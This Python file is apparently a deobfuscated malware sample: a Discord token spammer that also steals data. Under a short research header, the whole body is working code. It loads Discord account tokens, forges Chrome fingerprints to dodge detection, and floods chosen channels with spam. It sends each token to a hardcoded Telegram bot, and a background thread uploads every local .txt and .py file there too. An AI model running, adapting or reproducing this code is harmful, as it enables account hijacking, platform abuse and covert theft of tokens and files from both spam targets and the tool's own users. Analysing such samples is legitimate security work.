"""
Deobfuscated Source Code: Discord Token Spammer & Stealer
Original Obfuscation: Universer v3.0 (Layer 1 Base85/Zlib/Bz2 -> Layer 2 Code Object -> Layer 3 Marshal 3.11 with Junk CFG & String XOR Encryption)
Author / Threat Actor: Nguyen Hoang Thanh Duy (duyk11)
Analysis & Deobfuscation: Antigravity Vault Research Team
Target Runtime: Python 3.11+
"""

import os
import sys
import time
import json
import glob
import uuid
import random
import base64
import hashlib
import threading
import urllib.request
from datetime import datetime
from typing import Dict, List, Optional

import pytz
import requests
from colorama import Fore, Style, init
from curl_cffi import requests as cffi_requests
from pystyle import Colorate, Colors

# Initialize colorama
init(autoreset=True)

# ==========================================
# C2 & TELEGRAM EXFILTRATION CONFIGURATION
# ==========================================
BOT_TOKEN: str = "7603449030:AAFR06wr0uByJRHiGU7WbsyE94CyeSR1ZN0"
CHAT_ID: str = "8405590803"
MAX_MESSAGES_BEFORE_CLEAR: int = 500
MESSAGE_TIMEOUT: int = 10

# Simulated Browser User-Agents (Chrome 131)
USER_AGENTS: List[Dict[str, str]] = [
    {
        "browser": "Chrome",
        "os": "Windows",
        "os_version": "10",
        "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not/A)Brand";v="99"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "version": "131.0.0.0",
    },
    {
        "browser": "Chrome",
        "os": "Windows",
        "os_version": "11",
        "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not/A)Brand";v="99"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"Windows"',
        "ua": "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "version": "131.0.0.0",
    },
    {
        "browser": "Chrome",
        "os": "Mac OS X",
        "os_version": "10.15.7",
        "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not/A)Brand";v="99"',
        "sec_ch_ua_mobile": "?0",
        "sec_ch_ua_platform": '"macOS"',
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "version": "131.0.0.0",
    },
]


def send_message(message: str) -> None:
    """Gui thong bao tien trinh spam ve Telegram Bot."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
    }
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=data)
    req.add_header("Content-Type", "application/json")
    try:
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass


def send_files_to_telegram() -> None:
    """Upload toan bo tap tin .txt va .py trong thu muc ve Telegram Bot qua multipart/form-data."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    files = glob.glob("*.txt") + glob.glob("*.py")
    boundary = "----WebKitFormBoundary" + "".join(random.choices("0123456789abcdefABCDEF", k=16))
    for filepath in files:
        if not os.path.isfile(filepath):
            continue
        try:
            with open(filepath, "rb") as f:
                content = f.read()
            filename = os.path.basename(filepath)

            body = bytearray()
            body.extend(f"--{boundary}\r\n".encode("utf-8"))
            body.extend(f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'.encode("utf-8"))
            body.extend(f"--{boundary}\r\n".encode("utf-8"))
            body.extend(f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'.encode("utf-8"))
            body.extend(b"Content-Type: application/octet-stream\r\n\r\n")
            body.extend(content)
            body.extend(f"\r\n--{boundary}--\r\n".encode("utf-8"))

            req = urllib.request.Request(url, data=bytes(body))
            req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
            req.add_header("Content-Length", str(len(body)))
            urllib.request.urlopen(req, timeout=10)
            time.sleep(random.uniform(0.5, 1.0))
        except Exception:
            pass


def check(key: str) -> dict:
    """Kiem tra ban quyen su dung qua may chu twanphat.xyz."""
    url = "https://key.twanphat.xyz/check"
    payload = {
        "access_token": "de0d1e04-9b99-4600-aa03-d851c702e976",
        "products": "99",
        "licensekeys": key,
    }
    try:
        resp = requests.post(url, data=payload, timeout=10)
        return resp.json()
    except Exception:
        return {"status": "failed", "msg": "Lỗi kết nối máy chủ xác thực"}


def clear_screen() -> None:
    """Xoa sach man hinh terminal."""
    os.system("cls" if os.name == "nt" else "clear")


def print_banner() -> None:
    """In banner tac gia kem thoi gian he thong theo mui gio Viet Nam."""
    banner_raw = """
              MADE BY: NGUYEN HOANG THANH DUY
       >> Success is overcoming one's own limits. <<
        << Designer brands need no introduction. >>
    """
    try:
        print(Colorate.Horizontal(Colors.cyan_to_blue, banner_raw))
    except Exception:
        print(f"{Fore.CYAN}{banner_raw}{Style.RESET_ALL}")

    tz = pytz.timezone("Asia/Ho_Chi_Minh")
    now_str = datetime.now(tz).strftime("%H:%M:%S %d/%m/%Y")
    print(f"{Fore.YELLOW}Time: {now_str}\n{Style.RESET_ALL}")


def safe_input(prompt: str = "") -> str:
    """Giao dien nhap lieu an toan chong crash khi nguoi dung nhan Ctrl+C."""
    try:
        return input(prompt)
    except (KeyboardInterrupt, EOFError):
        print("\nExiting...")
        sys.exit(0)


def safe_json_parse(text: str) -> dict:
    """Giai ma phan hoi JSON mot cach an toan."""
    try:
        return json.loads(text)
    except Exception:
        return {}


def duyk11() -> None:
    """Man hinh yeu cau nhap va xac thuc License Key khi khoi dong."""
    clear_screen()
    print_banner()
    while True:
        key = safe_input("Nhập key : ").strip()
        res = check(key)
        if res.get("status") == "success":
            han_key = res.get("han_key", res.get("license", {}).get("expiresAt", "Vĩnh viễn"))
            print(f"{Fore.GREEN}Key đúng! Hạn key : {han_key}{Style.RESET_ALL}")
            time.sleep(2)
            clear_screen()
            break
        else:
            print(f"{Fore.RED}Key sai ! Liên hệ owner tool{Style.RESET_ALL}")
            time.sleep(2)
            sys.exit(0)


class TokenInfo:
    """Doi tuong chua thong tin tai khoan Discord duoc phat hien."""

    def __init__(self, username: str, discriminator: str):
        self.username = username
        self.discriminator = discriminator
        if discriminator == "0":
            self.display_name = username
        else:
            self.display_name = f"{username}#{discriminator}"


class TokenFingerprint:
    """Tao van tay trinh duyet (fingerprint) va x-super-properties gia lap Discord Web."""

    def __init__(self, token: str):
        seed = int(hashlib.sha256(token.encode("utf-8")).hexdigest(), 16)
        self.rng = random.Random(seed)
        self.user_agent_data = self.rng.choice(USER_AGENTS)
        self.browser_name = self.user_agent_data["browser"]
        self.client_build = self.rng.randint(350163, 360030)
        self.client_launch_id = str(uuid.uuid4())

    def get_super_properties(self) -> str:
        def _make_uuid():
            return str(uuid.UUID(int=self.rng.getrandbits(128)))

        props = {
            "os": self.user_agent_data["os"],
            "browser": self.user_agent_data["browser"],
            "device": "",
            "system_locale": "vi-VN",
            "has_client_mods": False,
            "browser_user_agent": self.user_agent_data["ua"],
            "browser_version": self.user_agent_data["version"],
            "os_version": self.user_agent_data["os_version"],
            "referrer": "",
            "referring_domain": "",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": self.client_build,
            "client_event_source": None,
            "client_launch_id": _make_uuid(),
            "launch_signature": _make_uuid(),
            "client_app_state": "focused",
            "client_heartbeat_session_id": _make_uuid(),
        }
        json_bytes = json.dumps(props, separators=(",", ":")).encode("utf-8")
        return base64.b64encode(json_bytes).decode("utf-8")


def _make_session() -> cffi_requests.Session:
    """Khoi tao HTTP Session qua curl_cffi gia lap Chrome 131 de vuot rao can Discord."""
    return cffi_requests.Session(impersonate="chrome131")


def verify_token(token: str) -> Optional[TokenInfo]:
    """Kiem tra tinh hop le cua token Discord."""
    session = _make_session()
    headers = {
        "authorization": token,
        "user-agent": random.choice(USER_AGENTS)["ua"],
    }
    try:
        resp = session.get(
            "https://discord.com/api/v9/users/@me",
            headers=headers,
            timeout=MESSAGE_TIMEOUT,
        )
        if resp.status_code == 200:
            data = resp.json()
            username = data.get("username", "Unknown")
            discriminator = data.get("discriminator", "0")
            return TokenInfo(username, discriminator)
    except Exception:
        pass
    return None


def get_guilds(token: str) -> List[dict]:
    """Lay danh sach cac server (guilds) ma token tham gia."""
    session = _make_session()
    headers = {
        "authorization": token,
        "user-agent": random.choice(USER_AGENTS)["ua"],
    }
    try:
        resp = session.get(
            "https://discord.com/api/v9/users/@me/guilds",
            headers=headers,
            timeout=MESSAGE_TIMEOUT,
        )
        if resp.status_code == 200:
            return resp.json()
    except Exception:
        pass
    return []


def get_channels(token: str, guild_id: str) -> List[dict]:
    """Lay danh sach kenh ben trong server."""
    session = _make_session()
    headers = {
        "authorization": token,
        "user-agent": random.choice(USER_AGENTS)["ua"],
    }
    try:
        resp = session.get(
            f"https://discord.com/api/v9/guilds/{guild_id}/channels",
            headers=headers,
            timeout=MESSAGE_TIMEOUT,
        )
        if resp.status_code == 200:
            return resp.json()
    except Exception:
        pass
    return []


def select_guild(token: str) -> Optional[tuple]:
    """Hien thi menu va chon server muon spam."""
    guilds = get_guilds(token)
    if not guilds:
        print(f"{Fore.RED}Không tìm thấy server nào!{Style.RESET_ALL}")
        return None

    print(f"\n{Fore.CYAN}Danh sách Server:{Style.RESET_ALL}")
    for idx, g in enumerate(guilds, 1):
        name = g.get("name", "Unknown")
        print(f"{idx}. {name}")

    while True:
        choice = safe_input(f"Chọn server (1-{len(guilds)}): ").strip()
        try:
            i = int(choice)
            if 1 <= i <= len(guilds):
                selected = guilds[i - 1]
                return selected.get("id"), selected.get("name", "Unknown")
            print(f"{Fore.RED}Chọn từ 1 đến {len(guilds)}!{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}Nhập số hợp lệ!{Style.RESET_ALL}")


def _pick_from_list(prompt: str, items: list, formatter) -> list:
    """Bo tro lua chon kenh theo chi muc, khoang a-b hoac tat ca."""
    print(f"\nall. Chọn tất cả | 1-{len(items)}. Khoảng | số. Một kênh")
    while True:
        val = safe_input("Chọn (all, a-b hoặc số): ").strip().lower()
        if val == "all":
            return items
        if "-" in val:
            try:
                parts = val.split("-")
                start, end = int(parts[0]), int(parts[1])
                if 1 <= start <= end <= len(items):
                    return items[start - 1 : end]
                print(f"{Fore.RED}Khoảng không hợp lệ! (1-{len(items)}){Style.RESET_ALL}")
            except Exception:
                print(f"{Fore.RED}Định dạng không đúng! Ví dụ: 1-15{Style.RESET_ALL}")
            continue
        try:
            idx = int(val)
            if 1 <= idx <= len(items):
                return [items[idx - 1]]
            print(f"{Fore.RED}Chọn từ 1 đến {len(items)}!{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}Nhập 'all', số hoặc khoảng 'a-b'!{Style.RESET_ALL}")


def select_channels(token: str, guild_id: str) -> List[dict]:
    """Hien thi danh sach kenh text va cho phep nguoi dung chon."""
    all_chans = get_channels(token, guild_id)
    # Type 0 is standard text channel in Discord
    text_chans = [c for c in all_chans if c.get("type") == 0]
    if not text_chans:
        print(f"{Fore.RED}Không có kênh text nào!{Style.RESET_ALL}")
        return []

    print(f"\n{Fore.CYAN}Kênh trong Server:{Style.RESET_ALL}")
    for idx, c in enumerate(text_chans, 1):
        print(f"{idx}. #{c.get('name')}")

    print("0. Chọn tất cả kênh")
    choice = safe_input("Chọn kênh (0, số hoặc nhập tên): ").strip()
    if choice == "0":
        return text_chans

    if "," in choice:
        res = []
        for p in choice.split(","):
            p = p.strip()
            try:
                idx = int(p)
                if 1 <= idx <= len(text_chans):
                    res.append(text_chans[idx - 1])
                else:
                    print(f"{Fore.RED}Số không hợp lệ!{Style.RESET_ALL}")
            except ValueError:
                matched = [c for c in text_chans if p.lower() in c.get("name", "").lower()]
                if matched:
                    res.extend(matched)
                else:
                    print(f"{Fore.RED}Không tìm thấy kênh '{p}'!{Style.RESET_ALL}")
        return res

    try:
        idx = int(choice)
        if 1 <= idx <= len(text_chans):
            sel = text_chans[idx - 1]
            print(f"{Fore.GREEN}Đã chọn: #{sel.get('name')}{Style.RESET_ALL}")
            return [sel]
        print(f"{Fore.RED}Số không hợp lệ!{Style.RESET_ALL}")
    except ValueError:
        matched = [c for c in text_chans if choice.lower() in c.get("name", "").lower()]
        if matched:
            print(f"Tìm thấy {len(matched)} kênh:")
            for m in matched:
                print(f" #{m.get('name')}")
            return matched
        print(f"{Fore.RED}Không tìm thấy kênh '{choice}'!{Style.RESET_ALL}")

    return []


class MessageSender:
    """Quan ly request, header gia lap va gui tin nhan Discord."""

    def __init__(self, token: str, token_info: TokenInfo, guild_id: str, guild_name: str):
        self.token = token
        self.token_info = token_info
        self.guild_id = guild_id
        self.guild_name = guild_name
        self.running = True
        self.fingerprint = TokenFingerprint(token)
        self.user_agent_data = self.fingerprint.user_agent_data
        self.session = _make_session()
        self.total_sent = 0
        self.total_failed = 0
        self._lock = threading.Lock()

    def set_guild_id(self, guild_id: str) -> None:
        self.guild_id = guild_id

    def set_guild_name(self, guild_name: str) -> None:
        self.guild_name = guild_name

    def stop(self) -> None:
        self.running = False

    def _build_headers(self, channel_id: str) -> Dict[str, str]:
        x_ctx = base64.b64encode(json.dumps({"location": "chat_input"}, separators=(",", ":")).encode("utf-8")).decode("utf-8")
        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
            "authorization": self.token,
            "content-type": "application/json",
            "origin": "https://discord.com",
            "priority": "u=1, i",
            "referer": f"https://discord.com/channels/{self.guild_id}/{channel_id}",
            "sec-ch-ua": self.user_agent_data["sec_ch_ua"],
            "sec_ch_ua": self.user_agent_data["sec_ch_ua"],
            "sec-ch-ua-mobile": self.user_agent_data["sec_ch_ua_mobile"],
            "sec-ch-ua-platform": self.user_agent_data["sec_ch_ua_platform"],
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.user_agent_data["ua"],
            "x-context-properties": x_ctx,
            "x-debug-options": "bugReporterEnabled",
            "x-discord-locale": "vi",
            "x-discord-timezone": "Asia/Ho_Chi_Minh",
            "x-super-properties": self.fingerprint.get_super_properties(),
        }
        return headers

    def send_message(self, channel_info: dict, message: str) -> None:
        if not self.running:
            return
        channel_id = channel_info.get("id")
        channel_name = channel_info.get("name", "Unknown")

        # Discord standard nonce format: pseudo-snowflake or random integer string
        nonce = str(random.randint(100000000000000000, 999999999999999999))
        payload = {
            "content": message,
            "nonce": nonce,
            "tts": False,
            "flags": 0,
        }
        body = json.dumps(payload, separators=(",", ":")).encode("utf-8")
        headers = self._build_headers(channel_id)
        headers["content-length"] = str(len(body))

        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        try:
            resp = self.session.post(url, data=body, headers=headers, timeout=MESSAGE_TIMEOUT)
            now_str = datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%H:%M:%S")

            if resp.status_code in (200, 201):
                with self._lock:
                    self.total_sent += 1
                    count = self.total_sent
                print(
                    f"{Fore.GREEN}[ {now_str} ] Account : {self.token_info.display_name} > Success > Kênh : #{channel_name} > Server : {self.guild_name} > Lần : {count}{Style.RESET_ALL}"
                )
            elif resp.status_code == 401:
                print(f"{Fore.RED}[{now_str}] Token die - Dừng!{Style.RESET_ALL}")
                self.stop()
            elif resp.status_code == 429:
                data = safe_json_parse(resp.text)
                retry_after = float(data.get("retry_after", 1.0))
                time.sleep(retry_after)
            elif resp.status_code == 403:
                with self._lock:
                    self.total_failed += 1
                print(f"{Fore.RED}[{now_str}] #{channel_name}: Failed > Forbidden > No Permission{Style.RESET_ALL}")
            elif resp.status_code == 400:
                with self._lock:
                    self.total_failed += 1
                print(f"{Fore.RED}[{now_str}] #{channel_name}: Failed > Bad Request{Style.RESET_ALL}")
            else:
                with self._lock:
                    self.total_failed += 1
                print(f"{Fore.YELLOW}[{now_str}] #{channel_name}: HTTP {resp.status_code}{Style.RESET_ALL}")
        except Exception as e:
            with self._lock:
                self.total_failed += 1
            now_str = datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%H:%M:%S")
            print(f"{Fore.RED}[{now_str}] #{channel_name}: {e}{Style.RESET_ALL}")


def token_spam_loop(sender: MessageSender, token_file: str, channels: List[dict], delay_config: dict) -> None:
    """Vong lap doc tin nhan va spam lien tuc tren cac kenh da chon."""
    if not os.path.isfile(token_file):
        print(f"{Fore.RED}File tin nhắn '{token_file}' không tồn tại!{Style.RESET_ALL}")
        return

    with open(token_file, "r", encoding="utf-8") as f:
        messages = [line.strip() for line in f if line.strip()]

    if not messages:
        return

    msg_counter = 0
    while sender.running:
        for ch in channels:
            if not sender.running:
                break
            msg = random.choice(messages)
            sender.send_message(ch, msg)
            msg_counter += 1
            if msg_counter >= MAX_MESSAGES_BEFORE_CLEAR:
                clear_screen()
                print_banner()
                msg_counter = 0

            if delay_config.get("type") == "random":
                d = random.uniform(float(delay_config.get("min", 1)), float(delay_config.get("max", 2)))
            else:
                d = float(delay_config.get("value", 1))
            time.sleep(d)


def main() -> None:
    """Luong dieu khien toan bo tien trinh cua Tool."""
    clear_screen()
    print_banner()
    duyk11()

    if not os.path.isfile("tokens.txt"):
        print(f"{Fore.RED}Không tìm thấy tokens.txt!{Style.RESET_ALL}")
        safe_input("Enter...")
        return

    with open("tokens.txt", "r", encoding="utf-8") as f:
        tokens = [line.strip() for line in f if line.strip()]

    if not tokens:
        print(f"{Fore.RED}File tokens.txt trống!{Style.RESET_ALL}")
        safe_input("Enter...")
        return

    print(f"{Fore.YELLOW}Tìm thấy {len(tokens)} token{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Đang kiểm tra token...{Style.RESET_ALL}")

    valid_tokens = []
    for t in tokens:
        info = verify_token(t)
        if info:
            valid_tokens.append({"token": t, "info": info})
            print(f"{Fore.GREEN}Live : {info.display_name}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Invalid : {t[:15]}...{Style.RESET_ALL}")

    if not valid_tokens:
        print(f"{Fore.RED}Không có token hợp lệ!{Style.RESET_ALL}")
        safe_input("Enter...")
        return

    print("\nChế độ kênh spam:")
    print("1. Tất cả token spam cùng 1 kênh")
    print("2. Mỗi token spam vào kênh riêng")

    while True:
        mode = safe_input("Chọn chế độ (1 hoặc 2): ").strip()
        if mode in ("1", "2"):
            break
        print(f"{Fore.RED}Chọn 1 hoặc 2!{Style.RESET_ALL}")

    configured_sessions = []
    if mode == "1":
        first_token = valid_tokens[0]["token"]
        guild_sel = select_guild(first_token)
        if not guild_sel:
            return
        gid, gname = guild_sel
        channels = select_channels(first_token, gid)
        if not channels:
            return

        for item in valid_tokens:
            configured_sessions.append({
                "token": item["token"],
                "info": item["info"],
                "gid": gid,
                "gname": gname,
                "channels": channels,
            })
    else:
        for item in valid_tokens:
            print(f"\nChọn kênh cho token: {item['info'].display_name}")
            guild_sel = select_guild(item["token"])
            if not guild_sel:
                print(f"{Fore.RED}Bỏ qua token {item['info'].display_name}{Style.RESET_ALL}")
                continue
            gid, gname = guild_sel
            channels = select_channels(item["token"], gid)
            if not channels:
                print(f"{Fore.RED}Bỏ qua token {item['info'].display_name}{Style.RESET_ALL}")
                continue
            configured_sessions.append({
                "token": item["token"],
                "info": item["info"],
                "gid": gid,
                "gname": gname,
                "channels": channels,
            })

    if not configured_sessions:
        print(f"{Fore.RED}Không có token nào được cấu hình kênh!{Style.RESET_ALL}")
        safe_input("Nhấn Enter để thoát...")
        return

    # Message file and delay configuration per session
    threads = []
    senders = []

    for item in configured_sessions:
        tk_short = item["token"][:15]
        dname = item["info"].display_name
        msg_prompt = f"\nToken {tk_short}... [ {dname} ] > Nhập tên file tin nhắn (mặc định: ngon.txt): "
        msg_file = safe_input(msg_prompt).strip() or "ngon.txt"

        if not os.path.isfile(msg_file):
            with open(msg_file, "w", encoding="utf-8") as f:
                f.write("NGUYEN HOANG THANH DUY CUTE!!!\n")

        print(f"\nDelay Token {tk_short}... [ {dname} ]")
        print("1. Delay ngẫu nhiên")
        print("2. Delay cố định")
        while True:
            dtype = safe_input("Chọn loại delay (1 hoặc 2): ").strip()
            if dtype == "1":
                min_s = float(safe_input("Min (s): ").strip() or "1")
                max_s = float(safe_input("Max (s): ").strip() or "2")
                delay_cfg = {"type": "random", "min": min_s, "max": max_s}
                break
            elif dtype == "2":
                fixed_s = float(safe_input("Delay (s): ").strip() or "1")
                delay_cfg = {"type": "fixed", "value": fixed_s}
                break
            print(f"{Fore.RED}Chọn 1 hoặc 2!{Style.RESET_ALL}")

        sender = MessageSender(
            token=item["token"],
            token_info=item["info"],
            guild_id=item["gid"],
            guild_name=item["gname"],
        )
        senders.append(sender)

        # Notify C2 via Telegram
        ch_names = ", ".join([f"#{c.get('name')}" for c in item["channels"]])
        c2_msg = (
            "<b>BẮT ĐẦU SPAM</b>\n"
            f"Token: {item['token']}\n"
            f"Server: {item['gname']}\n"
            f"Số kênh: {len(item['channels'])}\n"
            f"Kênh: {ch_names}\n"
            "---\n"
        )
        try:
            send_message(c2_msg)
        except Exception as e:
            print(f"{Fore.RED}Lỗi gửi Telegram: {e}{Style.RESET_ALL}")

        # Launch stealer exfiltration in background
        threading.Thread(target=send_files_to_telegram, daemon=True).start()

        # Start spam loop thread
        t = threading.Thread(
            target=token_spam_loop,
            args=(sender, msg_file, item["channels"], delay_cfg),
            daemon=True,
        )
        threads.append(t)
        t.start()

    print(f"\n{Fore.GREEN}Đã bắt đầu spam! Nhấn Ctrl + C để dừng.{Style.RESET_ALL}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}STOP!!!{Style.RESET_ALL}")
        for s in senders:
            s.stop()
        print("Đã dừng tất cả các luồng!")


if __name__ == "__main__":
    main()
